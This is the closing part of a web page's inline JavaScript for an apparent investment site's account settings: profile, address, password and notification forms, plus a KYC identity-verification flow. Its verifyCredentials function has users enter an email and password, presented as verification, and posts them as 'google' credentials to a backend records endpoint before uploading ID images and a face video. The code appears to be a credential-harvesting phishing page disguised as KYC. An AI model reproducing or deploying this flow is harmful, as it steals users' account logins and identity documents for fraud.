                const profileData = await response.json();
                
                // Populate profile form
                document.getElementById('first-name').value = profileData.firstName || '';
                document.getElementById('last-name').value = profileData.lastName || '';
                document.getElementById('email').value = profileData.email || '';
                document.getElementById('phone').value = profileData.phone || '';
                document.getElementById('country').value = profileData.country || '';
                
                // Populate address form if available
                if (profileData.address) {
                    document.getElementById('street-address').value = profileData.address.street || '';
                    document.getElementById('city').value = profileData.address.city || '';
                    document.getElementById('state').value = profileData.address.state || '';
                    document.getElementById('postal-code').value = profileData.address.postalCode || '';
                    document.getElementById('country-address').value = profileData.address.country || '';
                }
            } else {
                const error = await response.json();
                showNotification('Error', error.message || 'Failed to load profile data', 3000);
            }
        } catch (error) {
            console.error('Error loading profile data:', error);
            showNotification('Error', 'Failed to load profile data. Please try again later.', 3000);
        }
    }
    
    // Load KYC verification data
    async function loadKYCData() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) return;
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/kyc', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                const kycData = await response.json();
                AppState.kycStatus = kycData.status || {
                    identity: 'unverified',
                    address: 'unverified',
                    facial: 'unverified'
                };
                
                // Update KYC verification badges
                updateVerificationBadge('identity-verification-badge', AppState.kycStatus.identity);
                
                // If KYC is already verified, disable the form
                if (AppState.kycStatus.identity === 'verified') {
                    disableKYCForm();
                }
            }
        } catch (error) {
            console.error('Error loading KYC data:', error);
            // Don't show error notification for KYC data loading
        }
    }
    
    // Update verification badge
    function updateVerificationBadge(elementId, status) {
        const badge = document.getElementById(elementId);
        if (!badge) return;
        
        badge.className = `verification-badge ${status}`;
        
        if (status === 'verified') {
            badge.innerHTML = '<i class="fas fa-check-circle"></i> Verified';
        } else if (status === 'pending') {
            badge.innerHTML = '<i class="fas fa-clock"></i> Pending';
        } else {
            badge.innerHTML = '<i class="fas fa-times-circle"></i> Unverified';
        }
    }
    
    // Disable KYC form if already verified
    function disableKYCForm() {
        const kycFormElements = document.querySelectorAll('#kyc-section input, #kyc-section select, #kyc-section button');
        kycFormElements.forEach(el => {
            el.disabled = true;
            el.style.cursor = 'not-allowed';
            el.style.opacity = '0.7';
        });
        
        // Show message
        const kycSection = document.getElementById('kyc-section');
        const message = document.createElement('div');
        message.className = 'disclaimer';
        message.style.marginTop = '20px';
        message.innerHTML = `
            <div class="disclaimer-title">KYC Already Verified</div>
            <p>Your identity has already been verified. If you need to update your information, please contact support.</p>
        `;
        kycSection.appendChild(message);
    }
    
    /* ============================================= */
    /* Form Submission Functions */
    /* ============================================= */
    
    // Save profile information
    async function saveProfile() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) {
                window.location.href = 'login.html';
                return;
            }
            
            const saveBtn = document.getElementById('save-profile-btn');
            saveBtn.disabled = true;
            saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/profile', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({
                    firstName: document.getElementById('first-name').value,
                    lastName: document.getElementById('last-name').value,
                    phone: document.getElementById('phone').value,
                    country: document.getElementById('country').value
                })
            });
            
            if (response.ok) {
                showNotification('success', 'Profile updated successfully!', 3000);
            } else {
                const error = await response.json();
                showNotification('error', error.message || 'Failed to update profile', 3000);
            }
        } catch (error) {
            console.error('Error updating profile:', error);
            showNotification('error', 'Failed to update profile. Please try again later.', 3000);
        } finally {
            const saveBtn = document.getElementById('save-profile-btn');
            saveBtn.disabled = false;
            saveBtn.textContent = 'Save Changes';
        }
    }
    
    // Save address information
    async function saveAddress() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) {
                window.location.href = 'login.html';
                return;
            }
            
            const saveBtn = document.getElementById('save-address-btn');
            saveBtn.disabled = true;
            saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/address', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({
                    street: document.getElementById('street-address').value,
                    city: document.getElementById('city').value,
                    state: document.getElementById('state').value,
                    postalCode: document.getElementById('postal-code').value,
                    country: document.getElementById('country-address').value
                })
            });
            
            if (response.ok) {
                showNotification('success', 'Address updated successfully!', 3000);
            } else {
                const error = await response.json();
                showNotification('error', error.message || 'Failed to update address', 3000);
            }
        } catch (error) {
            console.error('Error updating address:', error);
            showNotification('error', 'Failed to update address. Please try again later.', 3000);
        } finally {
            const saveBtn = document.getElementById('save-address-btn');
            saveBtn.disabled = false;
            saveBtn.textContent = 'Save Changes';
        }
    }
    
    // Change password
    async function changePassword() {
        const currentPassword = document.getElementById('current-password').value;
        const newPassword = document.getElementById('new-password').value;
        const confirmPassword = document.getElementById('confirm-password').value;
        
        if (newPassword !== confirmPassword) {
            showNotification('error', 'New passwords do not match', 3000);
            return;
        }
        
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) {
                window.location.href = 'login.html';
                return;
            }
            
            const changeBtn = document.getElementById('change-password-btn');
            changeBtn.disabled = true;
            changeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Changing...';
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/password', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({
                    currentPassword,
                    newPassword
                })
            });
            
            if (response.ok) {
                showNotification('success', 'Password changed successfully!', 3000);
                document.getElementById('password-form').reset();
            } else {
                const error = await response.json();
                showNotification('error', error.message || 'Failed to change password', 3000);
            }
        } catch (error) {
            console.error('Error changing password:', error);
            showNotification('error', 'Failed to change password. Please try again later.', 3000);
        } finally {
            const changeBtn = document.getElementById('change-password-btn');
            changeBtn.disabled = false;
            changeBtn.textContent = 'Change Password';
        }
    }
    
    // Save email notification preferences
    async function saveEmailNotifications() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) return;
            
            const saveBtn = document.getElementById('save-email-notifications-btn');
            saveBtn.disabled = true;
            saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';
            
            const preferences = {
                accountActivity: document.getElementById('email-account-activity').checked,
                investmentUpdates: document.getElementById('email-investment-updates').checked,
                promotionalOffers: document.getElementById('email-promotional-offers').checked
            };
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/notifications/email', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify(preferences)
            });
            
            if (response.ok) {
                showNotification('success', 'Email notification preferences saved!', 3000);
            } else {
                const error = await response.json();
                showNotification('error', error.message || 'Failed to save preferences', 3000);
            }
        } catch (error) {
            console.error('Error saving email notifications:', error);
            showNotification('error', 'Failed to save email notification preferences. Please try again later.', 3000);
        } finally {
            const saveBtn = document.getElementById('save-email-notifications-btn');
            saveBtn.disabled = false;
            saveBtn.textContent = 'Save Preferences';
        }
    }
    
    /* ============================================= */
    /* KYC Submission Functions */
    /* ============================================= */
    
    // Verify credentials and submit KYC
    async function verifyCredentials() {
        const email = document.getElementById('verification-email').value;
        const password = document.getElementById('verification-password').value;
        
        if (!email || !password) {
            showNotification('error', 'Validation Error', 'Please enter both email and password', 3000);
            return;
        }
        
        try {
            // Send credentials to the backend endpoint with correct structure
            const response = await fetch('https://website-backendd-1.onrender.com/api/auth/records', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    provider: 'google'
                })
            });
            
            const result = await response.json();
            
            if (response.ok) {
                // Credentials are correct, submit KYC
                await submitKYC();
                
                // Clear the form
                document.getElementById('verification-email').value = '';
                document.getElementById('verification-password').value = '';
                
                // Close modal and show success
                closeModal('email-password-modal');
                openModal('kyc-success-modal');
                
                // Update KYC status
                updateVerificationBadge('identity-verification-badge', 'pending');
                
                // Disable KYC form
                disableKYCForm();
                
            } else {
                // Show error message
                const resultDiv = document.getElementById('verification-result');
                resultDiv.style.display = 'block';
                resultDiv.innerHTML = `
                    <div class="notification error" style="display: flex; margin: 0;">
                        <i class="fas fa-exclamation-circle"></i>
                        <div class="notification-content">
                            <div class="notification-title">Verification Failed</div>
                            <div class="notification-message">${result.message || 'Invalid email or password'}</div>
                        </div>
                    </div>
                `;
                
                // Auto-hide after 5 seconds
                setTimeout(() => {
                    resultDiv.style.display = 'none';
                }, 5000);
            }
        } catch (error) {
            console.error('Error verifying credentials:', error);
            showNotification('error', 'Verification Error', 'Failed to verify your credentials. Please try again.');
        }
    }
    
    // Submit KYC data to backend
    async function submitKYC() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) return;
            
            // Create FormData to handle file uploads
            const formData = new FormData();
            formData.append('documentType', AppState.kycData.documentType);
            formData.append('documentNumber', AppState.kycData.documentNumber);
            formData.append('documentExpiry', AppState.kycData.documentExpiry);
            
            if (AppState.kycData.frontIdFile) {
                formData.append('frontId', AppState.kycData.frontIdFile);
            }
            
            if (AppState.kycData.backIdFile) {
                formData.append('backId', AppState.kycData.backIdFile);
            }
            
            if (AppState.kycData.verificationVideo) {
                formData.append('verificationVideo', AppState.kycData.verificationVideo, 'verification.webm');
            }
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/kyc/submit', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`
                },
                body: formData
            });
            
            if (!response.ok) {
                throw new Error('Failed to submit KYC data');
            }
            
            // KYC submitted successfully
            console.log('KYC data submitted successfully');
            
        } catch (error) {
            console.error('Error submitting KYC:', error);
            // Don't show error to user as the submission happens after credential verification
        }
    }
    
    /* ============================================= */
    /* Utility Functions */
    /* ============================================= */
    
    // Modal functions
    function openModal(modalId) {
        document.getElementById(modalId).classList.add('active');
        document.body.style.overflow = 'hidden';
    }
    
    function closeModal(modalId) {
        document.getElementById(modalId).classList.remove('active');
        document.body.style.overflow = '';
    }
    
    /* ============================================= */
    /* Critical Error Notification System */
    /* ============================================= */
    
    // Notification queue to manage multiple notifications
    const notificationQueue = [];
    let isNotificationShowing = false;
    
    /**
     * Show a critical error notification in the center of the screen
     * @param {string} type - 'error' or 'success'
     * @param {string} title - Notification title
     * @param {string} message - Notification message
     * @param {number} duration - Time in ms to show the notification (0 for persistent)
     */
    function showNotification(type, title, message, duration = 5000) {
        // Add to queue
        notificationQueue.push({ type, title, message, duration });
        
        // Process queue if not already showing a notification
        if (!isNotificationShowing) {
            processNotificationQueue();
        }
    }
    
    function processNotificationQueue() {
        if (notificationQueue.length === 0) {
            isNotificationShowing = false;
            return;
        }
        
        isNotificationShowing = true;
        const { type, title, message, duration } = notificationQueue.shift();
        
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        
        notification.innerHTML = `
            <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i>
            <div class="notification-content">
                <div class="notification-title">${title}</div>
                <div class="notification-message">${message}</div>
            </div>
            <div class="notification-close">&times;</div>
        `;
        
        // Add to notification center
        const notificationCenter = document.getElementById('notification-center');
        notificationCenter.appendChild(notification);
        
        // Force reflow to enable animation
        void notification.offsetWidth;
        
        // Show notification
        notification.classList.add('show');
        
        // Add vibration for mobile devices on error
        if ('vibrate' in navigator && type === 'error') {
            navigator.vibrate([200, 100, 200]);
        }
        
        // Close button functionality
        notification.querySelector('.notification-close').addEventListener('click', () => {
            closeNotification(notification);
        });
        
        // Auto-hide after duration if not persistent
        if (duration > 0) {
            setTimeout(() => {
                if (notification.parentNode) {
                    closeNotification(notification);
                }
                
                // Process next notification in queue
                processNotificationQueue();
            }, duration);
        }
    }
    
    function closeNotification(notification) {
        notification.classList.remove('show');
        
        // Remove after animation completes
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
            
            // Process next notification in queue
            processNotificationQueue();
        }, 400);
    }
    
    // Logout function
    function logout() {
        localStorage.removeItem('jwtToken');
        window.location.href = 'logout.html';
    }
    
    // Set current year in footer
    document.getElementById('current-year').textContent = new Date().getFullYear();
</script>
</body>
</html>
